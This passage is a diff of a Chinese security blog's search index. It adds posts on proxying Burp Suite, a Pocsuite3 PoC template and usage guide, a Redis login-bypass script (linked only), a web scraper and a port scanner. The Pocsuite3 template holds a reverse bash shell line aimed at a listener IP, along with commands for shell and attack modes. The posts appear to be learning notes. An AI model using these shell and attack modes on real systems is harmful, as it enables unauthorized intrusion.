@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Burpsuite挂梯子抓包</title>
+    <url>/article/cfe7a8b3.html</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>准备挂代理访问外网挖洞实战（另一点是准备挂代理挖国内src~）</p>
+<p>然而挂了代理之后，bp就无法使用了。</p>
+<h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p><img src="/article/image-20210709130332150.png" alt="image-20210709130332150.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210709130332150.png" class="lozad post-image"></p>
+<p>1、Project options下，勾选Upstream Proxy Servers的override user option选项，出现3的输入框</p>
+<p>2、点击Add</p>
+<p> <img src="/article/image-20210709130546321.png" alt="image-20210709130546321" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210709130546321.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：*全部</span><br><span class="line">2：127.0.0.1</span><br><span class="line">3：梯子的端口</span><br><span class="line">4：None</span><br><span class="line">OK</span><br></pre>
+
+<p>3、配合bp原有的8080监听端口，打开梯子软件，可实现开启bp访问外网。</p>
+<p>注：梯子需要选择全局代理，否则国内网站依旧是真实ip。</p>
+<p>4、效果</p>
+<p><img src="/article/image-20210709131053927.png" alt="image-20210709131053927" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210709131053927.png" class="lozad post-image"></p>
+]]></content>
+      <categories>
+        <category>附加</category>
+      </categories>
+      <tags>
+        <tag>Burpsuite</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JBoss反序列化漏洞复现</title>
     <url>/article/b552cccc.html</url>
     <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
@@ -710,6 +733,412 @@
       </tags>
   </entry>
   <entry>
+    <title>Pocsuite3使用</title>
+    <url>/article/2cb80240.html</url>
+    <content><![CDATA[<h1 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h1><pre class="highlight"><span class="line">漏洞应用名_版本号_漏洞类型名称 </span><br></pre>
+
+<p>（所有字母均为小写,所有的符号改成_）</p>
+<p>例：</p>
+<pre class="highlight"><span class="line">88979_cmseasy_5_5_sql_injection.py</span><br></pre>
+
+
+
+<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><pre class="highlight"><span class="line">#导入所写PoC所需要类/文件，尽量不要使用第三方模块。</span><br><span class="line">#迫不得已使用第三方模块有其依赖规则，后面给出。</span><br><span class="line">from pocsuite3.api import Output,POCBase,register_poc,requests</span><br><span class="line"></span><br><span class="line">#PoC实现类，继承POCBase</span><br><span class="line">class DemoPoc(POCBase):</span><br><span class="line">	#PoC信息字段，需要完整填写全部下列信息</span><br><span class="line">	vulID = &#x27;1000&#x27;  					# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br><span class="line">    version = &#x27;1&#x27; 						# 默认为1</span><br><span class="line">    author = &#x27;chen&#x27; 					# PoC作者的大名</span><br><span class="line">    vulDate = &#x27;2014-10-16&#x27; 				# 漏洞公开的时间,不知道就写今天</span><br><span class="line">    createDate = &#x27;2014-10-16&#x27;			# 编写PoC的日期</span><br><span class="line">    updateDate = &#x27;2014-10-16&#x27;			# PoC更新的时间,默认和编写时间一样</span><br><span class="line">    references = [&#x27;https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html&#x27;]</span><br><span class="line">    									# 漏洞地址来源,0day不用写</span><br><span class="line">    name = &#x27;Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC&#x27;			# PoC名称</span><br><span class="line">    appPowerLink = &#x27;https://www.drupal.org/&#x27;			# 漏洞厂商主页地址</span><br><span class="line">    appName = &#x27;Drupal&#x27;									# 漏洞应用名称</span><br><span class="line">    appVersion = &#x27;7.x&#x27;									# 漏洞影响版本</span><br><span class="line">    vulType = &#x27;SQL Injection&#x27;							# 漏洞类型,类型参考见 漏洞类型规范表</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line">    	漏洞简要描述</span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    samples = []										# 测试样列,就是用 PoC 测试成功的网站</span><br><span class="line">    install_requires = [] 	# PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br><span class="line">    #第三方插件需再此处注明</span><br><span class="line">   	# 整个字段的值为list，每个项为一个依赖模块</span><br><span class="line">   	# install_requires =[str_item_,str_item,…] </span><br><span class="line">   	# 如果遇到安装时模块名与调用时的不一致情况，用:分割开</span><br><span class="line">   	# 例如常见的加密算法库pycryptodome,但是调用是以from Crypto.Cipher import AES,此时就需要如下填写</span><br><span class="line">	# install_requires = [&#x27;pycryptodome:Crypto&#x27;]</span><br><span class="line">   	pocDesc = &#x27;&#x27;&#x27; </span><br><span class="line">   		poc的用法描述 </span><br><span class="line">   	&#x27;&#x27;&#x27;</span><br><span class="line">   	</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> 	#编写验证模式</span><br><span class="line">	def _verify(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        # 验证代码</span><br><span class="line">        if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">     </span><br><span class="line">    #编写攻击模式</span><br><span class="line">    #若没有攻击模式，直接写return self._verify()即可</span><br><span class="line">    def _attack(self):</span><br><span class="line">    	output = Output(self)</span><br><span class="line">    	result = &#123;&#125;</span><br><span class="line">    	# 攻击代码</span><br><span class="line">    	if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    #编写shell模式</span><br><span class="line">    def _shell(self):</span><br><span class="line">    	cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())</span><br><span class="line">    	# 攻击代码 execute cmd</span><br><span class="line">    </span><br><span class="line">    #自定义输出函数，调用框架输出的实例Output</span><br><span class="line">	def parse_output(self,result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPoc)</span><br></pre>
+
+
+
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre class="highlight"><span class="line"># 使用test.py这个PoC去检测http://test.com这个url</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify </span><br><span class="line"></span><br><span class="line"># shell 反弹模式</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify --shell </span><br><span class="line"></span><br><span class="line"># pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递</span><br><span class="line">pocsuite -u http://test.com -r ecshop_rce.py --attack --command &quot;whoami&quot; </span><br><span class="line"></span><br><span class="line">#使用test.py这个PoC去检测url.txt文件里所有的url</span><br><span class="line">pocsuite -f url.txt -r test.py --verify </span><br></pre>
+
+
+
+<h1 id="Result结果参数说明"><a href="#Result结果参数说明" class="headerlink" title="Result结果参数说明"></a>Result结果参数说明</h1><pre class="highlight"><span class="line">result：[</span><br><span class="line">    &#123;  name: &#x27;DBInfo&#x27;，        value：&#x27;数据库内容&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value：&#x27;管理员密码&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Salt&#x27;，          value: &#x27;加密盐值&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;用户ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Groupid&#x27;，       value: &#x27;用户组ID&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;ShellInfo&#x27;，     value: &#x27;Webshell信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;Webshell地址&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;Webshell内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;FileInfo&#x27;，      value: &#x27;文件信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Filename&#x27;，      value: &#x27;文件名称&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;文件内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;XSSInfo&#x27;，       value: &#x27;跨站脚本信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Payload&#x27;，       value: &#x27;验证Payload&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;AdminInfo&#x27;，     value: &#x27;管理员信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;管理员ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;管理员密码&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;Database&#x27;，      value：&#x27;数据库信息&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Hostname&#x27;，      value: &#x27;数据库主机名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value：&#x27;数据库用户名&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;数据库密码&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;DBname&#x27;，        value: &#x27;数据库名&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;VerifyInfo&#x27;，    value: &#x27;验证信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Target&#x27;，        value: &#x27;验证host:port&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Postdata&#x27;，      value: &#x27;验证POST数据&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Path&#x27;，          value: &#x27;网站绝对路径&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;SiteAttr&#x27;，      value: &#x27;网站服务器信息&#x27;&#125;,</span><br><span class="line">    &#123;  name: &#x27;Process&#x27;，       value: &#x27;服务器进程&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br></pre>
+
+
+
+<h1 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h1><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>from pocsuite3.api import logger</td>
+<td>日志记录，比如logger.log(info)</td>
+</tr>
+<tr>
+<td>from pocsuite3.api import requests</td>
+<td>请求类，用法同 requests</td>
+</tr>
+<tr>
+<td>from pocsuite3.api import Seebug</td>
+<td>Seebug api 调用</td>
+</tr>
+<tr>
+<td>from pocsuite3.api import ZoomEye</td>
+<td>ZoomEye api 调用</td>
+</tr>
+<tr>
+<td>from pocsuite3.api import CEye</td>
+<td>Ceye api 调用</td>
+</tr>
+<tr>
+<td>from pocsuite3.api import crawl</td>
+<td>简单爬虫功能</td>
+</tr>
+<tr>
+<td>from pocsuite3.api import PHTTPServer</td>
+<td>Http服务功能</td>
+</tr>
+<tr>
+<td>from pocsuite3.api import REVERSE_PAYLOAD</td>
+<td>反向连接shell payload</td>
+</tr>
+<tr>
+<td>from pocsuite3.api import get_results</td>
+<td>获取结果</td>
+</tr>
+</tbody></table>
+<h1 id="漏洞类型规范"><a href="#漏洞类型规范" class="headerlink" title="漏洞类型规范"></a>漏洞类型规范</h1><table>
+<thead>
+<tr>
+<th>英文名称</th>
+<th>中文名称</th>
+<th>缩写</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Cross Site Scripting</td>
+<td>跨站脚本</td>
+<td>xss</td>
+</tr>
+<tr>
+<td>Cross Site Request Forgery</td>
+<td>跨站请求伪造</td>
+<td>csrf</td>
+</tr>
+<tr>
+<td>SQL Injection</td>
+<td>Sql注入</td>
+<td>sql-inj</td>
+</tr>
+<tr>
+<td>LDAP Injection</td>
+<td>ldap注入</td>
+<td>ldap-inj</td>
+</tr>
+<tr>
+<td>Mail Command Injection</td>
+<td>邮件命令注入</td>
+<td>smtp-inj</td>
+</tr>
+<tr>
+<td>Null Byte Injection</td>
+<td>空字节注入</td>
+<td>null-byte-inj</td>
+</tr>
+<tr>
+<td>CRLF Injection</td>
+<td>CRLF注入</td>
+<td>crlf-inj</td>
+</tr>
+<tr>
+<td>SSI Injection</td>
+<td>Ssi注入</td>
+<td>ssi-inj</td>
+</tr>
+<tr>
+<td>XPath Injection</td>
+<td>Xpath注入</td>
+<td>xpath-inj</td>
+</tr>
+<tr>
+<td>XML Injection</td>
+<td>Xml注入</td>
+<td>xml-inj</td>
+</tr>
+<tr>
+<td>XQuery Injection</td>
+<td>Xquery 注入</td>
+<td>xquery-inj</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>命令执行</td>
+<td>cmd-exec</td>
+</tr>
+<tr>
+<td>Code Execution</td>
+<td>代码执行</td>
+<td>code-exec</td>
+</tr>
+<tr>
+<td>Remote File Inclusion</td>
+<td>远程文件包含</td>
+<td>rfi</td>
+</tr>
+<tr>
+<td>Local File Inclusion</td>
+<td>本地文件包含</td>
+<td>lfi</td>
+</tr>
+<tr>
+<td>Abuse of Functionality</td>
+<td>功能函数滥用</td>
+<td>func-abuse</td>
+</tr>
+<tr>
+<td>Brute Force</td>
+<td>暴力破解</td>
+<td>brute-force</td>
+</tr>
+<tr>
+<td>Buffer Overflow</td>
+<td>缓冲区溢出</td>
+<td>buffer-overflow</td>
+</tr>
+<tr>
+<td>Content Spoofing</td>
+<td>内容欺骗</td>
+<td>spoofing</td>
+</tr>
+<tr>
+<td>Credential Prediction</td>
+<td>证书预测</td>
+<td>credential-prediction</td>
+</tr>
+<tr>
+<td>Session Prediction</td>
+<td>会话预测</td>
+<td>session-prediction</td>
+</tr>
+<tr>
+<td>Denial of Service</td>
+<td>拒绝服务</td>
+<td>dos</td>
+</tr>
+<tr>
+<td>Fingerprinting</td>
+<td>指纹识别</td>
+<td>finger</td>
+</tr>
+<tr>
+<td>Format String</td>
+<td>格式化字符串</td>
+<td>format-string</td>
+</tr>
+<tr>
+<td>HTTP Response Smuggling</td>
+<td>http响应伪造</td>
+<td>http-response-smuggling</td>
+</tr>
+<tr>
+<td>HTTP Response Splitting</td>
+<td>http响应拆分</td>
+<td>http-response-splitting</td>
+</tr>
+<tr>
+<td>HTTP Request Splitting</td>
+<td>http请求拆分</td>
+<td>http-request-splitting</td>
+</tr>
+<tr>
+<td>HTTP Request Smuggling</td>
+<td>http请求伪造</td>
+<td>http-request-smuggling</td>
+</tr>
+<tr>
+<td>HTTP Parameter Pollution</td>
+<td>http参数污染</td>
+<td>hpp</td>
+</tr>
+<tr>
+<td>Integer Overflows</td>
+<td>整数溢出</td>
+<td>int-overflow</td>
+</tr>
+<tr>
+<td>Predictable Resource Location</td>
+<td>可预测资源定位</td>
+<td>res-location</td>
+</tr>
+<tr>
+<td>Session Fixation</td>
+<td>会话固定</td>
+<td>session-fixation</td>
+</tr>
+<tr>
+<td>URL Redirector Abuse</td>
+<td>url重定向</td>
+<td>redirect</td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>权限提升</td>
+<td>privilege-escalation</td>
+</tr>
+<tr>
+<td>Resolve Error</td>
+<td>解析错误</td>
+<td>resolve-error</td>
+</tr>
+<tr>
+<td>Arbitrary File Creation</td>
+<td>任意文件创建</td>
+<td>file-creation</td>
+</tr>
+<tr>
+<td>Arbitrary File Download</td>
+<td>任意文件下载</td>
+<td>file-download</td>
+</tr>
+<tr>
+<td>Arbitrary File Deletion</td>
+<td>任意文件删除</td>
+<td>file-deletion</td>
+</tr>
+<tr>
+<td>Backup File Found</td>
+<td>备份文件发现</td>
+<td>bak-file-found</td>
+</tr>
+<tr>
+<td>Database Found</td>
+<td>数据库发现</td>
+<td>db-found</td>
+</tr>
+<tr>
+<td>Directory Listing</td>
+<td>目录遍历</td>
+<td>dir-listing</td>
+</tr>
+<tr>
+<td>Directory Traversal</td>
+<td>目录穿越</td>
+<td>dir-traversal</td>
+</tr>
+<tr>
+<td>File Upload</td>
+<td>文件上传</td>
+<td>file-upload</td>
+</tr>
+<tr>
+<td>Login Bypass</td>
+<td>登录绕过</td>
+<td>login-bypass</td>
+</tr>
+<tr>
+<td>Weak Password</td>
+<td>弱密码</td>
+<td>weak-pass</td>
+</tr>
+<tr>
+<td>Remote Password Change</td>
+<td>远程密码修改</td>
+<td>remote-pass-change</td>
+</tr>
+<tr>
+<td>Code Disclosure</td>
+<td>代码泄漏</td>
+<td>code-disclosure</td>
+</tr>
+<tr>
+<td>Path Disclosure</td>
+<td>路径泄漏</td>
+<td>path-disclosure</td>
+</tr>
+<tr>
+<td>Information Disclosure</td>
+<td>信息泄漏</td>
+<td>info-disclosure</td>
+</tr>
+<tr>
+<td>Security Mode Bypass</td>
+<td>安全模式绕过</td>
+<td>sec-bypass</td>
+</tr>
+<tr>
+<td>Malware</td>
+<td>挂马</td>
+<td>mal</td>
+</tr>
+<tr>
+<td>Black Link</td>
+<td>暗链</td>
+<td>black-link</td>
+</tr>
+<tr>
+<td>Backdoor</td>
+<td>后门</td>
+<td>backdoor</td>
+</tr>
+<tr>
+<td>Unauthorized access</td>
+<td>未授权访问</td>
+<td>Unauthorized access</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>pocsuite3模块</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pocsuite3重写redis脚本</title>
+    <url>/article/6c8e015a.html</url>
+    <content><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本脚本只做学习使用，请勿用作非法用途！</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>结合pocsuite3所学，重写redis漏洞复现。内含PoC模块、attack模块和shell模块。密码爆破功能请继续使用旧版本：<code>redis.py</code></p>
+<p>其中，shell模式下会报错，但是不影响命令写入和反弹shell（pocsuite模块监听可以，执行有些问题，可以重写监听端口–shell模块默认监听6666端口，手动开启监听）</p>
+<pre class="highlight"><span class="line">[ERROR] thread MainThread: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\threads.py&quot;, line 47, in run_threads</span><br><span class="line">    thread_function(*args)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\controller\controller.py&quot;, line 148, in task_run</span><br><span class="line">    result = poc_module.execute(target, headers=conf.http_headers, mode=conf.mode, verbose=False)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\poc.py&quot;, line 229, in execute</span><br><span class="line">    output.params = self.params</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br></pre>
+
+<p>搜了一下，应该是某个值为空，然后空值被调用了，导致报错。但是我的shell里面没写空值，看报错，也都是系统函数报错的，盲猜可能是不会使用pocsuite3的shell模块导致的。有了解的大佬请留言指正，感谢！</p>
+<p>下载地址：</p>
+<p>旧版（爆破功能）</p>
+<p><a href="https://www.zerochen.top/download/Redis/redis.py">https://www.zerochen.top/download/Redis/redis.py</a></p>
+<p>新版（pocsuite3模块）</p>
+<p><a href="https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python之网络爬虫</title>
+    <url>/article/f3b65bec.html</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
+<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>
+
+
+
+<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br><span class="line"></span><br></pre>
+
+
+
+<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>
+
+
+
+<h1 id="4、下载"><a href="#4、下载" class="headerlink" title="4、下载"></a>4、下载</h1><p><a href="https://www.zerochen.top/download/Scan/pc_sg.py">https://www.zerochen.top/download/Scan/pc_sg.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>BeautifulSoup模块</tag>
+        <tag>requests模块</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python之端口扫描</title>
     <url>/article/f37bf9f5.html</url>
     <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
@@ -731,40 +1160,37 @@
 
 <h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 